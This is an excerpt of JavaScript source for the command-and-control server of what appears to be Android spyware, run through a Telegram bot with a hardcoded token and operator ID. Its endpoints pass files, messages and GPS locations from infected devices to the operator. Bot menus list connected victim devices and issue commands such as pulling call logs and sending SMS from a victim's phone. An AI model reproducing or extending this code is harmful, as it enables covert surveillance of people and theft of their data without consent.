...
const token = '8997527125:AAGjkg-emwVgTzKZFxCSqXyWvPHQRW5J0dQ'
const authorizedId = '8881529092'
...
app.post("/uploadFile", upload.single('file'), (req, res) => {
    ...
    appBot.sendDocument(authorizedId, req.file.buffer, {
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(authorizedId, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(authorizedId, req.body['lat'], req.body['lon'])
    appBot.sendMessage(authorizedId, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    ...
    appBot.sendMessage(authorizedId,
...
appBot.on('message', (message) => {
    ...
    if (String(chatId) !== String(authorizedId)) {
        appBot.sendMessage(chatId, 'Unable to Access');
        return;
    }
    ...
    if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        if (appClients.size == 0) {
            ...
            appBot.sendMessage(authorizedId, text, {parse_mode: "HTML"})
        }
    }
    if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        if (appClients.size == 0) {
            ...
            appBot.sendMessage(authorizedId, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                "reply_markup": {
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    if (String(msg.chat.id) !== String(authorizedId)) {
        appBot.answerCallbackQuery(callbackQuery.id, {text: "Unable to Access"});
        return;
    }
    ...
    if (commend == 'calls') {
        ...
        appBot.deleteMessage(authorizedId, msg.message_id)
        appBot.sendMessage(authorizedId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
    ...
    if (commend == 'send_message') {
        appBot.deleteMessage(authorizedId, msg.message_id)
        appBot.sendMessage(authorizedId, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
